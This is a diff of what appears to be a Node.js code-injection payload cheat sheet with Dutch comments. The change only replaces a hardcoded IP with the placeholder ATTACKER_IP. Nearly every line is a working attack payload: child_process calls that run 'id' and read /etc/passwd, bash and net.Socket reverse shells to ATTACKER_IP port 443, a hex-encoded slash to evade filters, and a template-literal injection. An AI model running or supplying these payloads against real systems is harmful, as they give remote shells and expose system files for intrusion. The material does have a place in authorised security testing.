@@ -5,13 +5,13 @@
 require('child_process').execSync('id').toString()
 require('child_process').execSync('cat /etc/passwd').toString()
 # === Reverse shell via eval() ===
-require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.0.0.1/443 0>&1"')
+require('child_process').exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1"')
 # Of met net module:
-var net=require('net'),sh=require('child_process').exec('/bin/bash');var c=new net.Socket();c.connect(443,'10.0.0.1',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});
+var net=require('net'),sh=require('child_process').exec('/bin/bash');var c=new net.Socket();c.connect(443,'ATTACKER_IP',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});
 # === Slash bypass (hex encoding) ===
 # Als / geblokkeerd: gebruik \x2f
 var cmd = '\x2fbin\x2fbash';
-require('child_process').exec(cmd + ' -c "bash -i >& \x2fdev\x2ftcp\x2f10.0.0.1\x2f443 0>&1"')
+require('child_process').exec(cmd + ' -c "bash -i >& \x2fdev\x2ftcp\x2fATTACKER_IP\x2f443 0>&1"')
 # === Template literal injection ===
 ${require('child_process').execSync('id')}
 # === vm module sandbox escape ===
